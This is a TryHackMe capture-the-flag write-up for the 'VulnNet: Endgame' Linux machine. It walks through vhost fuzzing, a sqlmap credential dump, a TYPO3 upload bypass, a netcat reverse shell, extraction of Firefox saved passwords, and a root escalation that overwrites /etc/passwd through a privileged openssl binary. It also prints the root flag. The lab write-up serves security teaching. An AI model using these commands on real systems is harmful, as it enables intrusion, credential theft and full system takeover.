# VulnNet: Endgame — TryHackMe Writeup

> **Platform:** TryHackMe
> **Difficulty:** Medium
> **Operating System:** Linux
> **Category:** Web Exploitation, Credential Access, Privilege Escalation
> **Series:** VulnNet
> **Status:** Completed

---

## Disclaimer

This writeup documents a **legal CTF/laboratory environment** from TryHackMe. All techniques, commands, and exploitation steps shown below were performed against an intentionally vulnerable machine.

> Do not use these techniques against systems you do not own or do not have explicit permission to test.

---

# Table of Contents

* [Reconnaissance](#reconnaissance)
* [Port Scanning](#port-scanning)
* [Web Enumeration](#web-enumeration)
* [Virtual Host Enumeration](#virtual-host-enumeration)
* [API Discovery](#api-discovery)
* [SQL Injection](#sql-injection)
* [TYPO3 Access](#typo3-access)
* [Initial Foothold](#initial-foothold)
* [Shell Stabilization](#shell-stabilization)
* [Credential Access](#credential-access)
* [User Access](#user-access)
* [Privilege Escalation](#privilege-escalation)
* [Root Access](#root-access)
* [Attack Path](#attack-path)
* [Key Takeaways](#key-takeaways)

---

# Reconnaissance

The target machine IP address was:

```text
10.49.189.125
```

The first step was performing a full TCP port scan.

---

# Port Scanning

A complete port scan revealed only two open TCP ports:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The target was running:

* **SSH:** OpenSSH 7.6p1
* **HTTP:** Apache 2.4.29
* **Operating System:** Ubuntu / Linux

A more detailed scan confirmed:

```text
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

Since HTTP was available, the next stage was web enumeration.

---

# Web Enumeration

The application required the hostname:

```text
vulnnet.thm
```

Therefore, the target hostname was added to `/etc/hosts`.

The website itself did not reveal much useful information, so directory and file enumeration was performed.

## Directory Enumeration

The scan discovered several directories:

```text
/images
/css
/js
/fonts
/server-status
```

The `/server-status` endpoint returned:

```text
403 Forbidden
```

## File Enumeration

Further enumeration revealed:

```text
/index.html
/README.txt
/.htaccess
/.htpasswd
```

Several sensitive Apache-related files returned `403 Forbidden`, while `README.txt` was accessible.

At this stage, the main domain did not provide an immediate attack vector.

---

# Virtual Host Enumeration

Since the main website did not reveal enough information, virtual host enumeration was performed using `ffuf`.

```bash
ffuf -u http://vulnnet.thm \
-H "Host: FUZZ.vulnnet.thm" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-fs 0 -fs 65
```

This revealed multiple subdomains:

```text
api.vulnnet.thm
blog.vulnnet.thm
admin1.vulnnet.thm
shop.vulnnet.thm
```

These hostnames were then added to `/etc/hosts` for further enumeration.

---

# TYPO3 Enumeration

The `admin1.vulnnet.thm` virtual host contained a TYPO3 installation.

Directory enumeration revealed:

```text
/en
/fileadmin
/typo3conf
/typo3temp
/typo3
/vendor
```

The TYPO3 login panel was accessible at:

```text
http://admin1.vulnnet.thm/typo3/
```

Rather than attempting random exploits without knowing the exact version or having credentials, further enumeration was performed against the other discovered subdomains.

---

# API Discovery

While examining the application, an API request was discovered:

```javascript
getJSON(
    'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1',
    function(err, data) {
```

This API endpoint became the next target for testing.

---

# SQL Injection

The API endpoint was tested with SQLMap:

```bash
sqlmap "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1"
```

SQLMap identified a SQL injection vulnerability and reported:

```text
back-end DBMS: MySQL >= 5.0.12
web server operating system: Linux Ubuntu 18.04
web application technology: Apache 2.4.29
```

The database contained TYPO3 user information.

The following command was used to dump the relevant credentials:

```bash
sqlmap "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" \
--batch \
-D vn_admin \
-T be_users \
-C username,password \
--dump
```

A user account and password hash were recovered:

```text
Username: chris_w
Hash: $argon2i$...
```

After cracking the recovered hash, valid credentials were obtained:

```text
Username: chris_w
Password: vAxWtmNzeTz
```

These credentials provided access to the TYPO3 administration panel.

---

# TYPO3 Access

Using the recovered credentials:

```text
Username: chris_w
Password: vAxWtmNzeTz
```

it was possible to authenticate to the TYPO3 CMS.

An attempt to upload a standard PHP payload was initially blocked by the application's file upload restrictions.

Further investigation showed that the PHP deny configuration could be modified through the TYPO3 administrative functionality.

After bypassing the upload restriction, a PHP payload was uploaded to:

```text
/fileadmin/exp.php
```

Accessing the uploaded file resulted in code execution on the target.

---

# Initial Foothold

A listener was started:

```bash
rlwrap nc -lvnp 4444
```

The target connected back successfully:

```text
connect to [ATTACKER_IP] from [TARGET_IP]
```

The shell was running as:

```text
uid=33(www-data) gid=33(www-data)
```

Initial access had been achieved as:

```text
www-data
```

---

# Shell Stabilization

The initial shell did not have proper terminal functionality.

A Python PTY was spawned:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The terminal was then stabilized from the local machine using:

```bash
stty raw -echo
fg
```

Finally:

```bash
export TERM=xterm-256color
```

This provided a more usable interactive shell.

---

# Local Enumeration

The `/home/system` directory contained:

```text
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Utils
Videos
user.txt
```

However, the initial shell did not have permission to read the target user's files.

Further enumeration identified an interesting Firefox profile:

```text
/home/system/.mozilla/firefox/
```

A ZIP archive was created for exfiltration and analysis:

```bash
zip /tmp/system-mozilla.zip .mozilla -r
```

The archive was then transferred to the attacker machine.

---

# Credential Access

The Firefox profile was analyzed using the Firefox credential decryption utility.

Tool:

```text
firefox_decrypt
```

The profile was processed with:

```bash
python firefox_decrypt.py \
/home/kali/thm/vulnnetendgame/.mozilla/firefox/2fjnrwth.default-release
```

Stored credentials were successfully recovered:

```text
Website: https://tryhackme.com
Username: chris_w@vulnnet.thm
Password: 8y7TKQDpucKBYhwsb
```

The recovered credentials were then used to gain access as the `system` user.

---

# User Access

After authenticating as the target user:

```text
system@vulnnet-endgame
```

the user flag was accessible:

```text
/home/system/user.txt
```

> User-level access successfully achieved.

---

# Privilege Escalation

The next step was enumerating the system for privilege escalation opportunities.

During enumeration, an interesting binary was discovered inside:

```text
/home/system/Utils/
```

The binary was:

```text
openssl
```

Testing the binary showed that it could read privileged files.

For example:

```bash
./openssl enc -in /etc/shadow
```

This returned the contents of:

```text
/etc/shadow
```

This indicated that the binary was running with elevated privileges or otherwise allowed access to files normally restricted to the `system` user.

The ability to read sensitive files was a major indicator of a privilege escalation path.

---

# Exploiting the Privileged OpenSSL Binary

First, a copy of `/etc/passwd` was created:

```bash
cp /etc/passwd /tmp/passwd.bak
```

A new account with UID `0` was appended:

```bash
echo "pwned:\$1\$.YB66nk1\$8Gsn7z0GJMm8eH8D95k0K1:0:0:root:/root:/bin/bash" >> /tmp/passwd.bak
```

The modified file was then written back to `/etc/passwd` using the vulnerable `openssl` binary:

```bash
cat /tmp/passwd.bak | ./openssl enc -out /etc/passwd
```

The newly created account appeared in the file:

```text
pwned:x:0:0:root:/root:/bin/bash
```

Because the account had:

```text
UID = 0
GID = 0
```

it effectively had root privileges.

---

# Root Access

The newly created account was used:

```bash
su pwned
```

Successful privilege escalation resulted in:

```text
root@vulnnet-endgame
```

The root flag was located in:

```text
/root/thm-flag/root.txt
```

Root access was successfully achieved.

> **Pwned the machine.**

---

# Attack Path

The complete attack chain was:

```text
Port Scanning
     │
     ▼
HTTP Enumeration
     │
     ▼
VHOST Fuzzing
     │
     ▼
API Discovery
     │
     ▼
SQL Injection
     │
     ▼
Database Credential Dump
     │
     ▼
Password Cracking
     │
     ▼
TYPO3 Admin Access
     │
     ▼
Upload Restriction Bypass
     │
     ▼
Remote Code Execution
     │
     ▼
www-data Shell
     │
     ▼
Firefox Profile Discovery
     │
     ▼
Stored Credential Extraction
     │
     ▼
system User Access
     │
     ▼
Privileged OpenSSL Binary
     │
     ▼
Read /etc/shadow
     │
     ▼
Overwrite /etc/passwd
     │
     ▼
Create UID 0 User
     │
     ▼
ROOT
```

---

# Key Takeaways

## 1. Always Enumerate Thoroughly

The initial attack surface appeared small:

```text
22/tcp
80/tcp
```

However, deeper enumeration revealed multiple virtual hosts, APIs, a CMS administration panel, and additional attack paths.

A small number of open ports does **not** mean a small attack surface.

---

## 2. Virtual Host Enumeration Is Important

The primary domain did not immediately expose the vulnerability.

VHOST enumeration revealed:

```text
api.vulnnet.thm
blog.vulnnet.thm
admin1.vulnnet.thm
shop.vulnnet.thm
```

The API and administrative virtual hosts were critical to the compromise.

---

## 3. APIs Must Be Tested Like Any Other Attack Surface

The API endpoint contained a SQL injection vulnerability that allowed database enumeration and credential extraction.

Always inspect:

* URL parameters
* API endpoints
* JavaScript source code
* AJAX requests
* Hidden application functionality

---

## 4. Credential Reuse Can Lead to Full Compromise

Credentials recovered from the database provided access to the TYPO3 administration panel.

Later, credentials recovered from the Firefox profile provided access to the `system` user.

This demonstrates the importance of:

* Strong password management
* Avoiding password reuse
* Protecting browser credential stores
* Limiting unnecessary access to sensitive user profiles

---

## 5. Custom or Misconfigured Privileged Binaries Are Dangerous

The custom `openssl` binary was the final privilege escalation vector.

Its ability to access privileged files allowed:

```text
/etc/shadow → Sensitive Information Disclosure
/etc/passwd → Privilege Escalation
```

Any binary with elevated privileges should be carefully audited.

---

# Tools Used

| Tool                          | Purpose                                         |
| ----------------------------- | ----------------------------------------------- |
| `nmap`                        | Port and service enumeration                    |
| `gobuster`                    | Directory and file enumeration                  |
| `ffuf`                        | Virtual host fuzzing                            |
| `sqlmap`                      | SQL injection detection and database extraction |
| `hashcat` / Password cracking | Recovering credentials from the dumped hash     |
| `netcat`                      | Receiving the reverse shell                     |
| `rlwrap`                      | Improved shell interaction                      |
| `python3`                     | PTY shell stabilization                         |
| `firefox_decrypt`             | Extracting stored Firefox credentials           |
| `linpeas`                     | Local privilege escalation enumeration          |

---

# Final Access Summary

```text
Initial Access:
www-data
    │
    ▼
Credential Access:
Firefox Stored Credentials
    │
    ▼
User Access:
system
    │
    ▼
Privilege Escalation:
Misconfigured / Privileged OpenSSL Binary
    │
    ▼
Root Access:
root
```

---

# Flags

## User Flag

```text
Successfully obtained during the engagement.
```

## Root Flag

```text
THM{1d42edbb03c0b287a8d0d8a265dce012}
```

---

# Conclusion

VulnNet: Endgame demonstrates how multiple weaknesses can be chained together to achieve complete compromise of a Linux system.

The compromise involved:

```text
Web Enumeration
→ Virtual Host Discovery
→ API Analysis
→ SQL Injection
→ Credential Extraction
→ TYPO3 CMS Access
→ File Upload Bypass
→ Remote Code Execution
→ Firefox Credential Recovery
→ User Access
→ Privileged Binary Abuse
→ Root Access
```

The machine reinforces one of the most important lessons in penetration testing:

> **Enumeration is not a single step. It is a continuous process. Every new piece of access creates a new attack surface to investigate.**

---

## References

* TryHackMe: VulnNet: Endgame
* Nmap
* FFUF
* Gobuster
* SQLMap
* Firefox Decrypt

---

<p align="center">
  <b>Writeup created for educational and authorized security testing purposes only.</b>
</p>

<p align="center">
  <sub>Happy Hacking — Keep Learning, Keep Enumerating.</sub>
</p>
